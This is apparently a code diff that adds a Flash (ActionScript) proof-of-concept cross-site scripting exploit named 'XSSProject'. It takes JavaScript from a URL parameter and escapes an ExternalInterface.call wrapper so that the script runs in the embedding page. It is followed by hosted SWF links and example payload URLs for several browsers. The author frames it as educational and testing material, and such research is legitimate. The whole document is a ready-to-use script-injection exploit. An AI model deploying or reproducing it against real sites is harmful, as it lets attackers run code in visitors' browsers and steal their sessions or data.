@@ -1,0 +1,33 @@
+package
+{
+    import flash.display.Sprite;
+    import flash.external.*;
+    import flash.system.System;
+    public class XSSProject extends Sprite
+    {
+        public function XSSProject()
+        {
+            flash.system.Security.allowDomain("*");
+            ExternalInterface.marshallExceptions = true;
+            try {
+                ExternalInterface.call("0);}catch(e){};"+root.loaderInfo.parameters.js+"///*PoC by Soroush Dalili @IRSDL - only for testing/educational purposes - He accepts no responsibility for any bad/malicious usage*/");
+            } catch(e:Error) {
+                trace(e);
+            }
+        }
+    }
+}
+
+
+
+------
+
+https://dl.dropboxusercontent.com/u/37776965/exessess.swf
+
+Examples:
+
+Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
+
+IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
+
+IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
